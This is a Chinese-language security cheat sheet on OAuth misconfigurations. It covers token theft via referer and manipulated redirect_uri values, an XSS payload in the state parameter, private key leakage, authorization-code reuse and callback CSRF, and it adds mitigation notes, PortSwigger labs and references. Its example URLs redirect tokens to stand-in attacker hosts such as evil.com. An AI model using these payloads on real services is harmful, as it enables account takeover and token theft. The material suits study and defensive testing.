# OAuth 配置错误

> OAuth 是一个广泛使用的授权框架，允许第三方应用程序在不暴露用户凭据的情况下访问用户数据。然而，OAuth 的不当配置和实现可能导致严重的安全漏洞。本文档探讨了常见的 OAuth 配置错误、潜在的攻击向量以及缓解这些风险的最佳实践。

## 概述

- [通过 referer 窃取 OAuth Token](#通过-referer-窃取-oauth-token)
- [通过 redirect_uri 获取 OAuth Token](#通过-redirect_uri-获取-oauth-token)
- [通过 redirect_uri 执行 XSS](#通过-redirect_uri-执行-xss)
- [OAuth 私钥泄露](#oauth-私钥泄露)
- [违反授权码规则](#违反授权码规则)
- [跨站请求伪造](#跨站请求伪造)
- [实验室](#实验室)
- [参考文献](#参考文献)

## 通过 referer 窃取 OAuth Token

> 如果你有 HTML 注入但无法获得 XSS？该站点上是否有任何 OAuth 实现？如果是这样，设置一个指向服务器的 img 标签，并查看是否可以通过登录后的重定向等方式（例如重定向等）到受害者那里以通过 referer 窃取 OAuth Token - [@abugzlife1](https://twitter.com/abugzlife1/status/1125663944272748544)

## 通过 redirect_uri 获取 OAuth Token

重定向到受控域以获取访问令牌

```powershell
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

重定向到接受的开放 URL 以获取访问令牌

```powershell
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

OAuth 实现不应白名单整个域，而应仅限于几个 URL，以便“redirect_uri”不能指向开放重定向器。

有时需要将范围更改为无效范围以绕过对 redirect_uri 的过滤：

```powershell
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

## 通过 redirect_uri 执行 XSS

```powershell
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

## OAuth 私钥泄露

某些 Android/iOS 应用程序可以被反编译，并且可以访问 OAuth 私钥。

## 违反授权码规则

> 客户端不得多次使用授权码。

如果授权码被多次使用，授权服务器必须拒绝请求，并且在可能的情况下应撤销基于该授权码之前颁发的所有令牌。

## 跨站请求伪造

未检查 OAuth 回调中有效 CSRF 令牌的应用程序易受攻击。这可以通过初始化 OAuth 流并拦截回调 (`https://example.com/callback?code=AUTHORIZATION_CODE`) 来利用。此 URL 可用于 CSRF 攻击。

> 客户端必须为其重定向 URI 实现 CSRF 保护。这通常通过要求发送到重定向 URI 端点的任何请求都包括绑定到用户代理已认证状态的值来实现。客户端应利用“state”请求参数在发起授权请求时将此值传递给授权服务器。

## 实验室

- [PortSwigger - 通过 OAuth 隐式流绕过身份验证](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)
- [PortSwigger - 强制 OAuth 个人资料链接](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)
- [PortSwigger - 通过 redirect_uri 劫持 OAuth 帐户](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)
- [PortSwigger - 通过代理页面窃取 OAuth 访问令牌](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page)
- [PortSwigger - 通过开放重定向窃取 OAuth 访问令牌](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)

## 参考文献

- [你的所有 Paypal OAuth Token 都属于我 - asanso - 2016年11月28日](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html)
- [OAuth 2 - 我如何再次黑客攻击 Facebook（...并且会窃取有效的访问令牌） - asanso - 2014年4月8日](http://intothesymmetry.blogspot.ch/2014/04/oauth-2-how-i-have-hacked-facebook.html)
- [我如何再次黑客攻击 Github - Egor Homakov - 2014年2月7日](http://homakov.blogspot.ch/2014/02/how-i-hacked-github-again.html)
- [微软如何将你的数据交给 Facebook……以及其他人 - Andris Atteka - 2014年9月16日](http://andrisatteka.blogspot.ch/2014/09/how-microsoft-is-giving-your-data-to.html)
- [绕过 Periscope 管理面板中的 Google 身份验证 - Jack Whitton - 2015年7月20日](https://whitton.io/articles/bypassing-google-authentication-on-periscopes-admin-panel/)